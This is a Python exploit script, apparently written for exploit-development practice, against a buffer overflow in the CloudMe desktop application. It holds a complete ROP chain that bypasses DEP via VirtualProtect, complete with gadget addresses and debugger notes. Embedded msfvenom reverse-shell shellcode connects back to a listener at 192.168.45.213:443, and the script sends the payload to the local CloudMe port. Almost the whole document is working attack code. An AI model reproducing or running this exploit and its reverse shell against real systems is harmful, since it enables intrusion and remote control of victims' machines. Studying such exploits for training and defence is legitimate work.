#!/usr/bin/python3

from struct import pack
# import pwn
import socket
import sys


# attach WinDBG to CloudMe.exe
# restart program as admin with: taskkill /f /im CloudMe.exe ; sleep 1 ; C:\Users\User\AppData\Local\Programs\CloudMe\CloudMe\CloudMe.exe
# this exploit must be run locally on the system (target port is bound to localhost)


def main() :
    payload = buildPayload()
    sendPayload(payload)


# modules that stay at a constant address accross different program invocations
# 0:008> !nmod
# 00400000 00831000 CloudMe              /SafeSEH OFF                C:\Users\User\AppData\Local\Programs\CloudMe\CloudMe\CloudMe.exe
# 61b40000 62136000 Qt5Gui               /SafeSEH OFF                C:\Users\User\AppData\Local\Programs\CloudMe\CloudMe\Qt5Gui.dll
# 64b40000 64b5b000 libwinpthread_1      /SafeSEH OFF                C:\Users\User\AppData\Local\Programs\CloudMe\CloudMe\libwinpthread-1.dll
# 66e00000 66e3d000 Qt5Xml               /SafeSEH OFF                C:\Users\User\AppData\Local\Programs\CloudMe\CloudMe\Qt5Xml.dll
# 68a80000 69055000 Qt5Core              /SafeSEH OFF                C:\Users\User\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll
# 69900000 69ac1000 Qt5Network           /SafeSEH OFF                C:\Users\User\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll
# 6d9c0000 6da0c000 Qt5Sql               /SafeSEH OFF                C:\Users\User\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll
# 6eb40000 6eb64000 libgcc_s_dw2_1       /SafeSEH OFF                C:\Users\User\AppData\Local\Programs\CloudMe\CloudMe\libgcc_s_dw2-1.dll
# 6fe40000 6ffbe000 libstdc___6          /SafeSEH OFF                C:\Users\User\AppData\Local\Programs\CloudMe\CloudMe\libstdc++-6.dll

# => DEP bypass would not be necessary, but let's do it just for practice
# manually enable DEP with:
#      Windows Defender Security Center
#   -> App & Browser Control
#   -> Exploit Protection Settings
#   -> Program Settings
#   -> Add program to customize
#   -> Choose exact file path
#   -> enter path
#   -> Data Execution Prevention (DEP): Override, On
# then restart program


payloadSize = 0x2000

def buildPayload():

    # buf += pwn.cyclic(payloadSize)
    offBufEip = 0x41c                                           # pwn.cyclic_find(0x6b61616e)

    badchars    = b""                                           # there are no bad chars :)
    # buf += bytes([ b for b in range(0x100)
    #                  if b not in badchars])

    buf  = b""

    buf += b"_" * (offBufEip - len(buf) - len(virtualProtectStub()))    # padding
    buf += virtualProtectStub()                                 # setup call to VirtualProtect
    buf += ropChainVirtualProtect()                             # DEP bypass ROP chain; overwritten EIP redirects here
    buf += nopsled()
    buf += shellcode()                                          # note: stack is now executable
    buf += b"Z" * (payloadSize - len(buf))                      # padding to fixate payloadSize

    # some sanity checks
    assert len(buf) == payloadSize, f"Mismatching size: {len(buf)} != {payloadSize}"
    for b in badchars:
        assert b not in buf, print(f"Error: badchar {hex(b)} ('{chr(b)}') appeared in payload", "\n\n", pwn.hexdump(buf))

    return buf


def nopsled(length=0x10):
    return b"\x90" * length

def virtualProtectStub():
    buf  = b""
    buf += b"AAAA"      # Address of VirtualProtect
    buf += b"BBBB"      # Return address                = address of shellcode on the stack
    buf += b"CCCC"      # LPVOID lpAddress              = address of shellcode on the stack
    buf += b"DDDD"      # SIZE_T dwSize                 = payloadSize should be enough
    buf += b"EEEE"      # DWORD  flNewProtect           = 0x40 = PAGE_EXECUTE_READWRITE
    buf += b"FFFF"      # DWORD  lpflOldProtect         = address to some writable memory
    return buf

def ropChainVirtualProtect():
    """Calls VirtualProtect via ROP chain and then jumps into the next part of
    the exploit (shellcode); this part does alignment/ padding to a fixed size"""

    bufSize = 0x500                                             # fix size

    buf  = b""

    ################################################################################
    # align pointer register to begin of stub for calling VirtualProtect on the stack
    buf += pack("<I", 0x699e1da4)                               # push esp ; pop ebx ; pop esi
    offEspStub = -( len(virtualProtectStub()) + 4 )
    buf += pack("<i", offEspStub)
    buf += pack("<I", 0x61f6c155)                               # add ebx, esi

    ################################################################################
    # compute address of VirtualProtect

    # inspect Import Address Table (IAT) with WinDBG:
    # 0:015> !dh -a CloudMe => search for KERNEL32.dll => dump IAT and take first entry:
    #   _IMAGE_IMPORT_DESCRIPTOR 008170c8
    #     KERNEL32.dll
    #               0081A10C Import Address Table
    #               00818834 Import Name Table
    #                      0 time date stamp
    #                      0 Index of first forwarder reference

    #        7503BFF0   53 CloseHandle
    # 0:015> dds 0081A10C
    # 0081a10c  7503bff0 KERNEL32!CloseHandle
    closeHandleIAT = 0x0081a10c

    # 0:015> .shell -ci "!dh -a kernel32" findstr /i CloseHandle
    #        136  134 7503BFF0 CloseHandle
    # 0:015> .shell -ci "!dh -a kernel32" findstr /i VirtualProtect
    #       1477 1476 75034F50 VirtualProtect
    offClosehandleVirtualprotect = 0x75034F50 - 0x7503BFF0

    buf += pack("<I", 0x6d9d3905)                               # pop eax
    buf += pack("<I", closeHandleIAT)
    buf += pack("<I", 0x699f7da5)                               # mov eax,  [eax]
    buf += pack("<I", 0x66e1efda)                               # pop ebp
    buf += pack("<i", offClosehandleVirtualprotect)
    buf += pack("<I", 0x68c13557)                               # add ebp, eax

    ################################################################################
    # patch address of VirtualProtect
    buf += pack("<I", 0x64a9bc)                                 # mov  [ebx], ebp

    ################################################################################
    # compute address of shellcode
        # get value of esp
    buf += pack("<I", 0x66e1e0b8)                               # pop esi
    buf += pack("<I", 0x66e1efd9)                               # pop edi ; pop ebp (first undos call push)
    buf += pack("<I", 0x68c53dde)                               # push esp ; and al, 0x08 ; call esi
        # add some offset
    buf += pack("<I", 0x6d9d3905)                               # pop eax
    offEspShellcode = bufSize - len(buf) + 4
    buf += pack("<I", offEspShellcode)
    buf += pack("<I", 0x68c13557)                               # add ebp, eax

    ################################################################################
    # patch return address (address of shellcode)
    buf += pack("<I", 0x61ec44ae)                               # pop edx
    buf += pack("<I", 0x61ec44ae)                               # pop edx (remove pushed/saved EIP by call)
    buf += pack("<I", 0x61e8b831)                               # add ebx, 0x04 ; call edx
    buf += pack("<I", 0x64a9bc)                                 # mov  [ebx], ebp

    ################################################################################
    # patch lpAddress (address of shellcode)
    buf += pack("<I", 0x61ec44ae)                               # pop edx
    buf += pack("<I", 0x61ec44ae)                               # pop edx (remove pushed/saved EIP by call)
    buf += pack("<I", 0x61e8b831)                               # add ebx, 0x04 ; call edx
    buf += pack("<I", 0x64a9bc)                                 # mov  [ebx], ebp

    ################################################################################
    # patch dwSize
    tmp1 = 0x77777777
    buf += pack("<I", 0x66e1efda)                               # pop ebp
    buf += pack("<I", payloadSize + tmp1)
    buf += pack("<I", 0x6d9d3905)                               # pop eax
    buf += pack("<I", 0xffffffff+1 - tmp1)
    buf += pack("<I", 0x68c13557)                               # add ebp, eax

    buf += pack("<I", 0x61ec44ae)                               # pop edx
    buf += pack("<I", 0x61ec44ae)                               # pop edx (remove pushed/saved EIP by call)
    buf += pack("<I", 0x61e8b831)                               # add ebx, 0x04 ; call edx
    buf += pack("<I", 0x64a9bc)                                 # mov  [ebx], ebp

    ################################################################################
    # patch flNewProtect
    PAGE_EXECUTE_READWRITE = 0x40
    buf += pack("<I", 0x66e1efda)                               # pop ebp
    buf += pack("<I", PAGE_EXECUTE_READWRITE + tmp1)
    buf += pack("<I", 0x6d9d3905)                               # pop eax
    buf += pack("<I", 0xffffffff+1 - tmp1)
    buf += pack("<I", 0x68c13557)                               # add ebp, eax

    buf += pack("<I", 0x61ec44ae)                               # pop edx
    buf += pack("<I", 0x61ec44ae)                               # pop edx (remove pushed/saved EIP by call)
    buf += pack("<I", 0x61e8b831)                               # add ebx, 0x04 ; call edx
    buf += pack("<I", 0x64a9bc)                                 # mov  [ebx], ebp

    ################################################################################
    # patch lpflOldProtect
    # pointer to some writable memory: just use next DWORD that is reserved for this ROP chain
    buf += pack("<I", 0x66e1e0b8)                               # pop esi
    buf += pack("<I", 0x66e1efd9)                               # pop edi ; pop ebp (first undos call push)
    buf += pack("<I", 0x68c53dde)                               # push esp ; and al, 0x08 ; call esi

    buf += pack("<I", 0x61ec44ae)                               # pop edx
    buf += pack("<I", 0x61ec44ae)                               # pop edx (remove pushed/saved EIP by call)
    buf += pack("<I", 0x61e8b831)                               # add ebx, 0x04 ; call edx
    buf += pack("<I", 0x64a9bc)                                 # mov  [ebx], ebp

    ################################################################################
    # stack pivot

        # align eax to VirtualProtect stack frame
    buf += pack("<I", 0x6d9d3905)                               # pop eax
    offFrame = len(virtualProtectStub()) - 4
    buf += pack("<i", -offFrame)
    buf += pack("<I", 0x68c55f3e)                               # add eax, ebx ; pop ebx
    buf += b"JJJJ"                                              # junk

    # 0:000> dds @eax L6
    # 00a3d3e4  77544f50 KERNEL32!VirtualProtectStub
    # 00a3d3e8  00a3d8fc
    # 00a3d3ec  00a3d8fc
    # 00a3d3f0  00002000
    # 00a3d3f4  00000040
    # 00a3d3f8  00a3d4b0

        # actually pivot
    buf += pack("<I", 0x6d9db80a)                               # xchg eax, esp

    # buf += pack("<I", 0x66e1cf11)                             # int3 (debug gadget)

    # page protections on shellcode before:
    # 0:000> !vprot 00a3d8fc
    # BaseAddress:       00a3d000
    # AllocationBase:    00840000
    # AllocationProtect: 00000004  PAGE_READWRITE
    # RegionSize:        00003000
    # State:             00001000  MEM_COMMIT
    # Protect:           00000004  PAGE_READWRITE
    # Type:              00020000  MEM_PRIVATE

    # page protections on shellcode after:
    # 0:000> !vprot 00a3d8fc
    # BaseAddress:       00a3d000
    # AllocationBase:    00840000
    # AllocationProtect: 00000004  PAGE_READWRITE
    # RegionSize:        00003000
    # State:             00001000  MEM_COMMIT
    # Protect:           00000040  PAGE_EXECUTE_READWRITE
    # Type:              00020000  MEM_PRIVATE

    ################################################################################
    # pad out to fixed length
    buf += b"A" * (bufSize - len(buf))

    assert len(buf) == bufSize, f"Mismatching size: {len(buf)} != {bufSize}"

    return buf

def shellcode():
    buf  = b""
    # buf += b"\xcc"

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.213 LPORT=443 EXITFUNC=thread -f python -v buf
    # nc -vlnp 443
    buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
    buf += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
    buf += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
    buf += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
    buf += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    buf += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
    buf += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
    buf += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
    buf += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
    buf += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
    buf += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
    buf += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
    buf += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
    buf += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
    buf += b"\x2d\xd5\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
    buf += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
    buf += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
    buf += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
    buf += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
    buf += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
    buf += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
    buf += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
    buf += b"\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6"
    buf += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
    buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

    return buf


def sendPayload(payload):
    print("[+] Sending payload")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 8888))
    s.send(payload)
    s.close()
    # input("[+] Press enter to exit")


if __name__ == "__main__":
    main()
